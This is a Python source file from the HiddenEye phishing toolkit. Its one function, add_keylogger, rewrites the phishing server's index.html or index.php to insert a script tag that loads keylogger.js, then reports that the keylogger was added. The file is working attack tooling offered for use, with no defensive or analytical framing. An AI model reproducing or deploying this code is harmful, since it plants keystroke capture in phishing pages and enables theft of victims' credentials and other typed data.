#
#    HiddenEye  Copyright (C) 2020  DarkSec https://dark-sec-official.com
#    This program comes with ABSOLUTELY NO WARRANTY; for details read LICENSE.
#    This is free software, and you are welcome to redistribute it
#    under certain conditions; you can read LICENSE for details.
#
import Defs.ThemeManager.theme as theme
from Defs.ImportManager.unsorted_will_be_replaced import path
from Defs.ImportManager.unsorted_will_be_replaced import run_command
from Defs.ImportManager.unsorted_will_be_replaced import wait

default_palette = theme.default_palette


def add_keylogger():
    if path.exists("Server/www/index.html"):
        with open("Server/www/index.html") as f:
            read_data = f.read()
        c = read_data.replace("</title>",
                              '</title><script src="keylogger.js"></script>')
        f = open("Server/www/index.html", "w")
        f.write(c)
        f.close()
        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(
            default_palette[0], default_palette[4]))
        wait(2)
    else:
        with open("Server/www/index.php") as f:
            read_data = f.read()
        c = read_data.replace("</title>",
                              '</title><script src="keylogger.js"></script>')
        f = open("Server/www/index.php", "w")
        f.write(c)
        f.close()
        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(
            default_palette[0], default_palette[4]))
        wait(2)
